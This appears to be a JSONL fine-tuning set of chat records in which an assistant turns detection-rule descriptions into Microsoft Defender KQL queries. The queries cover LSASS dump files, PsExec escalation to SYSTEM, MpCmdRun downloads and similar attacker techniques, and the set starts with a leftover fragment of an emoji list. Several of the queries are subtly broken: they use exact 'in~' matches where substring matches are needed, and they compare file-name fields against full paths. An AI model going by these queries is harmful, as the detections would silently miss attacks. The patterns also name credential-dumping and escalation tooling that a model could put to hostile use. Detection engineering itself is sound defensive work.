\"\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc\", \"\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd\", \"\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe\", \"\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff\", \"\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb\", \"\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc\", \"\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd\", \"\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe\", \"\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff\", \"\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb\", \"\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc\", \"\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd\", \"\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe\", \"\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff\", \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb\", \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc\", \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd\", \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe\", \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff\", \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffb\", \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffc\", \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffd\", \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffe\", \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udfff\", \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb\", \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc\", \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd\", \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe\", \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff\", \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffb\", \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffc\", \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffd\", \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffe\", \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udfff\", \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb\", \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc\", \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd\", \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe\", \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff\", \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffb\", \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffc\", \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffd\", \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffe\", \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udfff\", \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb\", \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc\", \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd\", \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe\", \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff\", \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffb\", \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffc\", \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffd\", \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffe\", \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udfff\", \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb\", \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc\", \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd\", \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe\", \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff\", \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffb\", \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffc\", \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffd\", \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffe\", \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udfff\", \"\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffc\", \"\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffd\", \"\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffe\", \"\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udfff\", \"\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffb\", \"\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffd\", \"\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffe\", \"\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udfff\", \"\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffb\", \"\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffc\", \"\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffe\", \"\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udfff\", \"\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffb\", \"\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffc\", \"\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffd\", \"\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udfff\", \"\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffb\", \"\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffc\", \"\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffd\", \"\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects commands that temporarily turn off Volume Snapshots Topic: proc_creation_win_reg_volsnap_disable"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"\\\\Services\\\\VSS\\\\Diag\", \"/d Disabled\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a file that has the same name as the default LiveKD kernel memory dump. Topic: file_event_win_sysinternals_livekd_default_dump_name"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"C:\\\\Windows\\\\livekd.dmp\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when an attacker adds a new \"Debugger\" value to the \"Hangs\" key in order to achieve persistence which will get invoked when an application crashes Topic: registry_set_hangs_debugger_persistence"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\Windows Error Reporting\\\\Hangs\\\\Debugger\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the presence of the keywords \"lsass\" and \".dmp\" in the commandline, which could indicate a potential attempt to dump or create a dump of the lsass process.\n Topic: proc_creation_win_susp_lsass_dmp_cli_keywords"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine contains \"lsass.dmp\" or ProcessCommandLine contains \"lsass.zip\" or ProcessCommandLine contains \"lsass.rar\" or ProcessCommandLine contains \"Andrew.dmp\" or ProcessCommandLine contains \"Coredump.dmp\" or ProcessCommandLine contains \"NotLSASS.zip\" or ProcessCommandLine contains \"lsass_2\" or ProcessCommandLine contains \"lsassdump\" or ProcessCommandLine contains \"lsassdmp\") or (ProcessCommandLine contains \"lsass\" and ProcessCommandLine contains \".dmp\") or (ProcessCommandLine contains \"SQLDmpr\" and ProcessCommandLine contains \".mdmp\") or (ProcessCommandLine contains \"nanodump\" and ProcessCommandLine contains \".dmp\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of Sysinternals ADExplorer with the \"-snapshot\" flag in order to save a local copy of the active directory database to a suspicious directory. Topic: proc_creation_win_sysinternals_adexplorer_susp_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"snapshot\" and (FolderPath endswith \"\\\\ADExplorer.exe\" or ProcessVersionInfoOriginalFileName =~ \"AdExp\") and (ProcessCommandLine in~ (\"\\\\Downloads\\\\\", \"\\\\Users\\\\Public\\\\\", \"\\\\AppData\\\\\", \"\\\\Windows\\\\Temp\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious DACL modifications to deny access to a service that affects critical trustees. This can be used to hide services or make them unstoppable. Topic: proc_creation_win_sc_sdset_deny_service_access"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\sc.exe\" or ProcessVersionInfoOriginalFileName =~ \"sc.exe\") and (ProcessCommandLine in~ (\"sdset\", \"D;\")) and (ProcessCommandLine in~ (\";IU\", \";SU\", \";BA\", \";SY\", \";WD\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of Windows Defender MpCmdRun.EXE to download files Topic: proc_creation_win_mpcmdrun_download_arbitrary_file"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"DownloadFile\", \"url\")) and (ProcessVersionInfoOriginalFileName =~ \"MpCmdRun.exe\" or FolderPath endswith \"\\\\MpCmdRun.exe\" or ProcessCommandLine contains \"MpCmdRun.exe\" or ProcessVersionInfoFileDescription =~ \"Microsoft Malware Protection Command Line Utility\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the deletion of the PowerShell console History logs which may indicate an attempt to destroy forensic evidence Topic: file_delete_win_delete_powershell_command_history"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\PSReadLine\\\\ConsoleHost_history.txt\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potentially suspicious child processes of a ClickOnce deployment application Topic: proc_creation_win_dfsvc_suspicious_child_processes"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\AppData\\\\Local\\\\Apps\\\\2.0\\\\\" and (InitiatingProcessFolderPath in~ (\"\\\\calc.exe\", \"\\\\cmd.exe\", \"\\\\cscript.exe\", \"\\\\explorer.exe\", \"\\\\mshta.exe\", \"\\\\net.exe\", \"\\\\net1.exe\", \"\\\\nltest.exe\", \"\\\\notepad.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\reg.exe\", \"\\\\regsvr32.exe\", \"\\\\rundll32.exe\", \"\\\\schtasks.exe\", \"\\\\werfault.exe\", \"\\\\wscript.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects addition of users to highly privileged groups via \"Net\" or \"Add-LocalGroupMember\". Topic: proc_creation_win_susp_add_user_privileged_group"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"Group Policy Creator Owners\", \"Schema Admins\")) and ((ProcessCommandLine contains \"localgroup \" and ProcessCommandLine contains \" /add\") or (ProcessCommandLine contains \"Add-LocalGroupMember \" and ProcessCommandLine contains \" -Group \"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious commandline flags used by PsExec and PAExec to escalate a command line to LOCAL_SYSTEM rights Topic: proc_creation_win_sysinternals_psexec_paexec_escalate_system"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"psexec\", \"paexec\", \"accepteula\")) and (ProcessCommandLine contains \" -s cmd\" or ProcessCommandLine contains \" /s cmd\" or ProcessCommandLine contains \" \u2013s cmd\" or ProcessCommandLine contains \" \u2014s cmd\" or ProcessCommandLine contains \" \u2015s cmd\" or ProcessCommandLine contains \" -s -i cmd\" or ProcessCommandLine contains \" -s /i cmd\" or ProcessCommandLine contains \" -s \u2013i cmd\" or ProcessCommandLine contains \" -s \u2014i cmd\" or ProcessCommandLine contains \" -s \u2015i cmd\" or ProcessCommandLine contains \" /s -i cmd\" or ProcessCommandLine contains \" /s /i cmd\" or ProcessCommandLine contains \" /s \u2013i cmd\" or ProcessCommandLine contains \" /s \u2014i cmd\" or ProcessCommandLine contains \" /s \u2015i cmd\" or ProcessCommandLine contains \" \u2013s -i cmd\" or ProcessCommandLine contains \" \u2013s /i cmd\" or ProcessCommandLine contains \" \u2013s \u2013i cmd\" or ProcessCommandLine contains \" \u2013s \u2014i cmd\" or ProcessCommandLine contains \" \u2013s \u2015i cmd\" or ProcessCommandLine contains \" \u2014s -i cmd\" or ProcessCommandLine contains \" \u2014s /i cmd\" or ProcessCommandLine contains \" \u2014s \u2013i cmd\" or ProcessCommandLine contains \" \u2014s \u2014i cmd\" or ProcessCommandLine contains \" \u2014s \u2015i cmd\" or ProcessCommandLine contains \" \u2015s -i cmd\" or ProcessCommandLine contains \" \u2015s /i cmd\" or ProcessCommandLine contains \" \u2015s \u2013i cmd\" or ProcessCommandLine contains \" \u2015s \u2014i cmd\" or ProcessCommandLine contains \" \u2015s \u2015i cmd\" or ProcessCommandLine contains \" -i -s cmd\" or ProcessCommandLine contains \" -i /s cmd\" or ProcessCommandLine contains \" -i \u2013s cmd\" or ProcessCommandLine contains \" -i \u2014s cmd\" or ProcessCommandLine contains \" -i \u2015s cmd\" or ProcessCommandLine contains \" /i -s cmd\" or ProcessCommandLine contains \" /i /s cmd\" or ProcessCommandLine contains \" /i \u2013s cmd\" or ProcessCommandLine contains \" /i \u2014s cmd\" or ProcessCommandLine contains \" /i \u2015s cmd\" or ProcessCommandLine contains \" \u2013i -s cmd\" or ProcessCommandLine contains \" \u2013i /s cmd\" or ProcessCommandLine contains \" \u2013i \u2013s cmd\" or ProcessCommandLine contains \" \u2013i \u2014s cmd\" or ProcessCommandLine contains \" \u2013i \u2015s cmd\" or ProcessCommandLine contains \" \u2014i -s cmd\" or ProcessCommandLine contains \" \u2014i /s cmd\" or ProcessCommandLine contains \" \u2014i \u2013s cmd\" or ProcessCommandLine contains \" \u2014i \u2014s cmd\" or ProcessCommandLine contains \" \u2014i \u2015s cmd\" or ProcessCommandLine contains \" \u2015i -s cmd\" or ProcessCommandLine contains \" \u2015i /s cmd\" or ProcessCommandLine contains \" \u2015i \u2013s cmd\" or ProcessCommandLine contains \" \u2015i \u2014s cmd\" or ProcessCommandLine contains \" \u2015i \u2015s cmd\" or ProcessCommandLine contains \" -s pwsh\" or ProcessCommandLine contains \" /s pwsh\" or ProcessCommandLine contains \" \u2013s pwsh\" or ProcessCommandLine contains \" \u2014s pwsh\" or ProcessCommandLine contains \" \u2015s pwsh\" or ProcessCommandLine contains \" -s -i pwsh\" or ProcessCommandLine contains \" -s /i pwsh\" or ProcessCommandLine contains \" -s \u2013i pwsh\" or ProcessCommandLine contains \" -s \u2014i pwsh\" or ProcessCommandLine contains \" -s \u2015i pwsh\" or ProcessCommandLine contains \" /s -i pwsh\" or ProcessCommandLine contains \" /s /i pwsh\" or ProcessCommandLine contains \" /s \u2013i pwsh\" or ProcessCommandLine contains \" /s \u2014i pwsh\" or ProcessCommandLine contains \" /s \u2015i pwsh\" or ProcessCommandLine contains \" \u2013s -i pwsh\" or ProcessCommandLine contains \" \u2013s /i pwsh\" or ProcessCommandLine contains \" \u2013s \u2013i pwsh\" or ProcessCommandLine contains \" \u2013s \u2014i pwsh\" or ProcessCommandLine contains \" \u2013s \u2015i pwsh\" or ProcessCommandLine contains \" \u2014s -i pwsh\" or ProcessCommandLine contains \" \u2014s /i pwsh\" or ProcessCommandLine contains \" \u2014s \u2013i pwsh\" or ProcessCommandLine contains \" \u2014s \u2014i pwsh\" or ProcessCommandLine contains \" \u2014s \u2015i pwsh\" or ProcessCommandLine contains \" \u2015s -i pwsh\" or ProcessCommandLine contains \" \u2015s /i pwsh\" or ProcessCommandLine contains \" \u2015s \u2013i pwsh\" or ProcessCommandLine contains \" \u2015s \u2014i pwsh\" or ProcessCommandLine contains \" \u2015s \u2015i pwsh\" or ProcessCommandLine contains \" -i -s pwsh\" or ProcessCommandLine contains \" -i /s pwsh\" or ProcessCommandLine contains \" -i \u2013s pwsh\" or ProcessCommandLine contains \" -i \u2014s pwsh\" or ProcessCommandLine contains \" -i \u2015s pwsh\" or ProcessCommandLine contains \" /i -s pwsh\" or ProcessCommandLine contains \" /i /s pwsh\" or ProcessCommandLine contains \" /i \u2013s pwsh\" or ProcessCommandLine contains \" /i \u2014s pwsh\" or ProcessCommandLine contains \" /i \u2015s pwsh\" or ProcessCommandLine contains \" \u2013i -s pwsh\" or ProcessCommandLine contains \" \u2013i /s pwsh\" or ProcessCommandLine contains \" \u2013i \u2013s pwsh\" or ProcessCommandLine contains \" \u2013i \u2014s pwsh\" or ProcessCommandLine contains \" \u2013i \u2015s pwsh\" or ProcessCommandLine contains \" \u2014i -s pwsh\" or ProcessCommandLine contains \" \u2014i /s pwsh\" or ProcessCommandLine contains \" \u2014i \u2013s pwsh\" or ProcessCommandLine contains \" \u2014i \u2014s pwsh\" or ProcessCommandLine contains \" \u2014i \u2015s pwsh\" or ProcessCommandLine contains \" \u2015i -s pwsh\" or ProcessCommandLine contains \" \u2015i /s pwsh\" or ProcessCommandLine contains \" \u2015i \u2013s pwsh\" or ProcessCommandLine contains \" \u2015i \u2014s pwsh\" or ProcessCommandLine contains \" \u2015i \u2015s pwsh\" or ProcessCommandLine contains \" -s powershell\" or ProcessCommandLine contains \" /s powershell\" or ProcessCommandLine contains \" \u2013s powershell\" or ProcessCommandLine contains \" \u2014s powershell\" or ProcessCommandLine contains \" \u2015s powershell\" or ProcessCommandLine contains \" -s -i powershell\" or ProcessCommandLine contains \" -s /i powershell\" or ProcessCommandLine contains \" -s \u2013i powershell\" or ProcessCommandLine contains \" -s \u2014i powershell\" or ProcessCommandLine contains \" -s \u2015i powershell\" or ProcessCommandLine contains \" /s -i powershell\" or ProcessCommandLine contains \" /s /i powershell\" or ProcessCommandLine contains \" /s \u2013i powershell\" or ProcessCommandLine contains \" /s \u2014i powershell\" or ProcessCommandLine contains \" /s \u2015i powershell\" or ProcessCommandLine contains \" \u2013s -i powershell\" or ProcessCommandLine contains \" \u2013s /i powershell\" or ProcessCommandLine contains \" \u2013s \u2013i powershell\" or ProcessCommandLine contains \" \u2013s \u2014i powershell\" or ProcessCommandLine contains \" \u2013s \u2015i powershell\" or ProcessCommandLine contains \" \u2014s -i powershell\" or ProcessCommandLine contains \" \u2014s /i powershell\" or ProcessCommandLine contains \" \u2014s \u2013i powershell\" or ProcessCommandLine contains \" \u2014s \u2014i powershell\" or ProcessCommandLine contains \" \u2014s \u2015i powershell\" or ProcessCommandLine contains \" \u2015s -i powershell\" or ProcessCommandLine contains \" \u2015s /i powershell\" or ProcessCommandLine contains \" \u2015s \u2013i powershell\" or ProcessCommandLine contains \" \u2015s \u2014i powershell\" or ProcessCommandLine contains \" \u2015s \u2015i powershell\" or ProcessCommandLine contains \" -i -s powershell\" or ProcessCommandLine contains \" -i /s powershell\" or ProcessCommandLine contains \" -i \u2013s powershell\" or ProcessCommandLine contains \" -i \u2014s powershell\" or ProcessCommandLine contains \" -i \u2015s powershell\" or ProcessCommandLine contains \" /i -s powershell\" or ProcessCommandLine contains \" /i /s powershell\" or ProcessCommandLine contains \" /i \u2013s powershell\" or ProcessCommandLine contains \" /i \u2014s powershell\" or ProcessCommandLine contains \" /i \u2015s powershell\" or ProcessCommandLine contains \" \u2013i -s powershell\" or ProcessCommandLine contains \" \u2013i /s powershell\" or ProcessCommandLine contains \" \u2013i \u2013s powershell\" or ProcessCommandLine contains \" \u2013i \u2014s powershell\" or ProcessCommandLine contains \" \u2013i \u2015s powershell\" or ProcessCommandLine contains \" \u2014i -s powershell\" or ProcessCommandLine contains \" \u2014i /s powershell\" or ProcessCommandLine contains \" \u2014i \u2013s powershell\" or ProcessCommandLine contains \" \u2014i \u2014s powershell\" or ProcessCommandLine contains \" \u2014i \u2015s powershell\" or ProcessCommandLine contains \" \u2015i -s powershell\" or ProcessCommandLine contains \" \u2015i /s powershell\" or ProcessCommandLine contains \" \u2015i \u2013s powershell\" or ProcessCommandLine contains \" \u2015i \u2014s powershell\" or ProcessCommandLine contains \" \u2015i \u2015s powershell\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potentially suspicious CommandLine of electron apps (teams, discord, slack, etc.). This could be a sign of abuse to proxy execution through a signed binary. Topic: proc_creation_win_susp_electron_execution_proxy"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"--browser-subprocess-path\", \"--gpu-launcher\", \"--renderer-cmd-prefix\", \"--utility-cmd-prefix\")) and ((FolderPath endswith \"\\\\chrome.exe\" or FolderPath endswith \"\\\\code.exe\" or FolderPath endswith \"\\\\discord.exe\" or FolderPath endswith \"\\\\GitHubDesktop.exe\" or FolderPath endswith \"\\\\keybase.exe\" or FolderPath endswith \"\\\\msedge_proxy.exe\" or FolderPath endswith \"\\\\msedge.exe\" or FolderPath endswith \"\\\\msedgewebview2.exe\" or FolderPath endswith \"\\\\msteams.exe\" or FolderPath endswith \"\\\\slack.exe\" or FolderPath endswith \"\\\\Teams.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"chrome.exe\", \"code.exe\", \"discord.exe\", \"GitHubDesktop.exe\", \"keybase.exe\", \"msedge_proxy.exe\", \"msedge.exe\", \"msedgewebview2.exe\", \"msteams.exe\", \"slack.exe\", \"Teams.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of \"forfiles\" from a non-default location, in order to potentially spawn a custom \"cmd.exe\" from the current working directory.\n Topic: proc_creation_win_forfiles_child_process_masquerading"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine startswith \"/c echo \\\"\" and (InitiatingProcessCommandLine in~ (\".exe\", \".exe\\\"\")) and InitiatingProcessFolderPath =~ \"\\\\cmd.exe\") and (not(((FolderPath contains \":\\\\Windows\\\\System32\\\\\" or FolderPath contains \":\\\\Windows\\\\SysWOW64\\\\\") and InitiatingProcessFileName =~ \"\\\\forfiles.exe\" and InitiatingProcessFolderPath =~ \"\\\\cmd.exe\")))"}]}
